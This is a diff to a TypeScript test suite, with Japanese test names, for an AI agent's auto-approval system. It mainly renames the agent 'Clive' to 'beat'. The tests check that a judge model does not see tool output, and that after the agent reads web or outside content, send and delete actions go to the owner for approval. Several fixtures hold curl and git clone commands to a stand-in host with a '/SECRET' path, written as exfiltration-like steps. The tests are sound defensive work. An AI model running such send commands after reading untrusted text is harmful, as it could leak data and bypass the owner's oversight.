@@ -69,7 +69,7 @@ test('自動承認（エンジン）: 外のメモを読むコマンドは、判
   assert.ok(shown.includes(REQUEST), '利用者の最後の発言を見せる');
   assert.ok(shown.includes('outside.txt'), '操作（コマンド）を見せる');
   assert.ok(!shown.includes('TOOL-RESULT-MARKER'), '道具の結果は見せない');
-  assert.ok(!shown.includes('ASSISTANT-TEXT-MARKER'), 'Clive の返事は見せない');
+  assert.ok(!shown.includes('ASSISTANT-TEXT-MARKER'), 'beat の返事は見せない');
   assert.ok(!shown.includes('外のメモの中身'), 'ファイルの中身は見せない');
   const final = JSON.stringify(calls[3]!.messages);
   assert.ok(final.includes('外のメモの中身'), '許したコマンドは実際に動き、その結果を本体が読む');
@@ -220,7 +220,7 @@ test('自動承認（エンジン）: Web を読んだあとの外読みは、�
 });
 
 test('自動承認（エンジン）: Web を読んだあとの送る操作・消す操作は、判定役が何と答える設定でも判定役に回さず、札が出る。札の理由に「送信」「削除」が載る', async t => {
-  const fetchGet = process.platform === 'win32' ? 'curl.exe -s https://clive-test.invalid/SECRET' : 'curl -s https://clive-test.invalid/SECRET';
+  const fetchGet = process.platform === 'win32' ? 'curl.exe -s https://beat-test.invalid/SECRET' : 'curl -s https://beat-test.invalid/SECRET';
   const s = await webApp(t);
   s.adapter().scripts = [toolCall('web_fetch', { url: 'https://news.example.com/' }), toolCall('shell_run', { command: fetchGet }), say('おわり')];
   s.app.conversations.setChoice('c1', { permissionMode: 'auto' });
@@ -275,7 +275,7 @@ test('自動承認（エンジン）: Web を読んだ実行が止められた�
 test('自動承認（エンジン）: 外のメモを自動で読んだあとの、許可の一覧にある取得（curl）は、同じ返事の中でも札が出る。判定役は 2 回目を見ない', async t => {
   const s = await startApp(t);
   const outside = outsideRead(s);
-  const fetch = process.platform === 'win32' ? 'curl.exe -s https://clive-test.invalid/SECRET' : 'curl -s https://clive-test.invalid/SECRET';
+  const fetch = process.platform === 'win32' ? 'curl.exe -s https://beat-test.invalid/SECRET' : 'curl -s https://beat-test.invalid/SECRET';
   s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), toolCall('shell_run', { command: fetch }), say('おわり')];
   const sent = await post(s, REQUEST, { permissionMode: 'auto' });
   await waitFor(() => s.app.approvals.pending().length === 1, '外を読んだあとの取得の札');
@@ -291,7 +291,7 @@ test('自動承認（エンジン）: 外のメモを自動で読んだあとの
 test('自動承認（エンジン）: シェルで外から取得したら、実行の記録に「外から読んだ」印が残る。そのあとの外読みは判定役が決める', async t => {
   const s = await startApp(t);
   const outside = outsideRead(s);
-  const fetch = process.platform === 'win32' ? 'curl.exe -s https://clive-test.invalid/SECRET' : 'curl -s https://clive-test.invalid/SECRET';
+  const fetch = process.platform === 'win32' ? 'curl.exe -s https://beat-test.invalid/SECRET' : 'curl -s https://beat-test.invalid/SECRET';
   s.adapter().scripts = [toolCall('shell_run', { command: fetch }), toolCall('shell_run', { command: outside.command }), say(ALLOW), say('おわり')];
   const sent = await post(s, REQUEST, { permissionMode: 'auto' });
   await settled(s.app, sent.body.runId);
@@ -335,7 +335,7 @@ test('自動承認（エンジン）: 外から読んだことの無い会話に
   assert.equal(s.app.conversations.everTainted(CONVERSATION), false, '外を読んだだけでは付かない（許可フォルダの外のファイルは、外から来た文ではない）');
 
   const fetching = await startApp(t);
-  const fetch = process.platform === 'win32' ? 'curl.exe -s https://clive-test.invalid/' : 'curl -s https://clive-test.invalid/';
+  const fetch = process.platform === 'win32' ? 'curl.exe -s https://beat-test.invalid/' : 'curl -s https://beat-test.invalid/';
   fetching.adapter().scripts = [toolCall('shell_run', { command: fetch }), say('取得しました')];
   const second = await post(fetching, '取得して');
   await settled(fetching.app, second.body.runId);
@@ -393,7 +393,7 @@ test('自動承認（エンジン）: 持ち主が札で許した git clone も�
   const s = await startApp(t);
   const outside = outsideRead(s);
   // 名前が引けない宛先（.invalid）なので、動いても外には出ず、失敗して終わる。失敗しても印は付く
-  s.adapter().scripts = [toolCall('shell_run', { command: 'git clone https://clive-test.invalid/x.git' }), toolCall('shell_run', { command: outside.command }), say(ALLOW), say('おわり')];
+  s.adapter().scripts = [toolCall('shell_run', { command: 'git clone https://beat-test.invalid/x.git' }), toolCall('shell_run', { command: outside.command }), say(ALLOW), say('おわり')];
   const sent = await post(s, REQUEST, { permissionMode: 'auto' });
   await waitFor(() => s.app.approvals.pending().length === 1, 'git clone の札');
   const cloneCard = s.app.approvals.pending()[0]!;
@@ -498,7 +498,7 @@ test('自動承認（タスク）: 判定役が答えられない（モデルを
 });
 
 test('自動承認（タスク）: Web を読んだあとの送る操作・消す操作は、判定役に回さず持ち主に聞く', async t => {
-  const fetchGet = process.platform === 'win32' ? 'curl.exe -s https://clive-test.invalid/SECRET' : 'curl -s https://clive-test.invalid/SECRET';
+  const fetchGet = process.platform === 'win32' ? 'curl.exe -s https://beat-test.invalid/SECRET' : 'curl -s https://beat-test.invalid/SECRET';
   for (const [label, step, reason] of [
     ['送る', toolCall('shell_run', { command: fetchGet }), /This sends something out/u],
     ['消す（記憶）', toolCall('memory_forget', { id: 1, reason: 'x' }), null],
@@ -552,7 +552,7 @@ test('自動承認（タスク）: 判定役に見せる依頼は、持ち主の
   const command = workspaceRead(s);
   const started = await runTaskWith(s, [WEB(), toolCall('shell_run', { command }), say(ALLOW), say('おわり')], () => {
     const task = s.app.tasks.create({ title: 'TITLE-MARKER', body: 'BODY-MARKER', doneCriteria: 'DONE-MARKER', nextAction: 'NEXT-ACTION-MARKER', origin: 'user', actor: 'user' });
-    s.app.tasks.event(task.id, 'reason', 'clive', 'HISTORY-MARKER');
+    s.app.tasks.event(task.id, 'reason', 'beat', 'HISTORY-MARKER');
     return task;
   });
   await started.done;
@@ -562,11 +562,11 @@ test('自動承認（タスク）: 判定役に見せる依頼は、持ち主の
   for (const marker of ['NEXT-ACTION-MARKER', 'HISTORY-MARKER', TASK_PROMPT]) assert.ok(!shown.includes(marker), marker);
 });
 
-test('自動承認（タスク）: Clive が自分で決めたタスク・好奇心のタスク・それを元にした予定のタスクは、依頼が持ち主の文でないので持ち主に聞く', async t => {
+test('自動承認（タスク）: beat が自分で決めたタスク・好奇心のタスク・それを元にした予定のタスクは、依頼が持ち主の文でないので持ち主に聞く', async t => {
   for (const [label, make] of [
-    ['self', (s: Awaited<ReturnType<typeof webApp>>) => s.app.tasks.create({ title: '自分で決めた', origin: 'self', actor: 'clive' })],
+    ['self', (s: Awaited<ReturnType<typeof webApp>>) => s.app.tasks.create({ title: '自分で決めた', origin: 'self', actor: 'beat' })],
     ['curiosity', (s: Awaited<ReturnType<typeof webApp>>) => s.app.tasks.create({ title: '気になる', origin: 'curiosity', actor: 'worker' })],
-    ['self の予定', (s: Awaited<ReturnType<typeof webApp>>) => s.app.tasks.spawnNow(s.app.tasks.create({ title: '自分で決めた予定', origin: 'self', actor: 'clive', cron: '0 9 * * *' }).id)!],
+    ['self の予定', (s: Awaited<ReturnType<typeof webApp>>) => s.app.tasks.spawnNow(s.app.tasks.create({ title: '自分で決めた予定', origin: 'self', actor: 'beat', cron: '0 9 * * *' }).id)!],
   ] as const) {
     const s = await webApp(t);
     const command = workspaceRead(s);
@@ -578,20 +578,20 @@ test('自動承認（タスク）: Clive が自分で決めたタスク・好奇
   }
 });
 
-test('自動承認（タスク）: Clive が自分で決めたタスク・好奇心のタスクの実行が作るタスクは、requested_by_user でも Clive が決めたもの（self）になる', async t => {
+test('自動承認（タスク）: beat が自分で決めたタスク・好奇心のタスクの実行が作るタスクは、requested_by_user でも beat が決めたもの（self）になる', async t => {
   for (const origin of ['self', 'curiosity', 'user'] as const) {
     const s = await webApp(t);
-    const started = await runTaskWith(s, [toolCall('task_create', { title: `作る-${origin}`, requested_by_user: true }), say('おわり')], () => s.app.tasks.create({ title: '元のタスク', origin, actor: 'clive' }));
+    const started = await runTaskWith(s, [toolCall('task_create', { title: `作る-${origin}`, requested_by_user: true }), say('おわり')], () => s.app.tasks.create({ title: '元のタスク', origin, actor: 'beat' }));
     await started.done;
     const made = s.app.db.prepare('SELECT origin FROM tasks WHERE title = ?').get(`作る-${origin}`) as { origin: string } | undefined;
     assert.equal(made?.origin, origin === 'user' ? 'user' : 'self', origin);
   }
 });
 
-test('自動承認（タスク）: 繰り返しの予定を消しても、Clive が決めた予定から作った実行のタスクは、Clive が決めたもの（判定役に見せる依頼は空）のまま', async t => {
+test('自動承認（タスク）: 繰り返しの予定を消しても、beat が決めた予定から作った実行のタスクは、beat が決めたもの（判定役に見せる依頼は空）のまま', async t => {
   const s = await webApp(t);
   for (const origin of ['self', 'user'] as const) {
-    const template = s.app.tasks.create({ title: `予定-${origin}`, origin, actor: 'clive', cron: '0 9 * * *' });
+    const template = s.app.tasks.create({ title: `予定-${origin}`, origin, actor: 'beat', cron: '0 9 * * *' });
     const instance = s.app.tasks.spawnNow(template.id)!;
     s.app.tasks.finish(instance.id, 'done', null, 'user');
     s.app.tasks.remove(template.id);
@@ -614,8 +614,8 @@ test('自動承認（タスク）: よそから来た文を読んだ実行（そ
       const runId = `run-${label}`;
       if (tainted !== 'missing') s.app.runs.start(runId, 'chat', chat.id);
       if (tainted === true) s.app.runs.markTainted(runId);
-      const task = s.app.tasks.create({ title: '作られたタスク', origin: 'user', actor: 'clive' });
-      s.app.tasks.event(task.id, kind, 'clive', 'x', runId);
+      const task = s.app.tasks.create({ title: '作られたタスク', origin: 'user', actor: 'beat' });
+      s.app.tasks.event(task.id, kind, 'beat', 'x', runId);
       return task;
     });
     if (tainted) assert.equal((await ownerDecides(s, started, label)).classified, 0, label);
@@ -651,8 +651,8 @@ test('自動承認（タスク）: よそから来た文を読んだ会話（eve
     const chat = s.app.conversations.create({ title: '読んだ会話' });
     s.app.conversations.markTainted(chat.id);
     s.app.runs.start('run-clean', 'chat', chat.id);
-    const task = s.app.tasks.create({ title: '作られたタスク', origin: 'user', actor: 'clive' });
-    s.app.tasks.event(task.id, 'context', 'clive', 'x', 'run-clean');
+    const task = s.app.tasks.create({ title: '作られたタスク', origin: 'user', actor: 'beat' });
+    s.app.tasks.event(task.id, 'context', 'beat', 'x', 'run-clean');
     return task;
   });
   assert.equal((await ownerDecides(s, started, 'ever_tainted')).classified, 0);
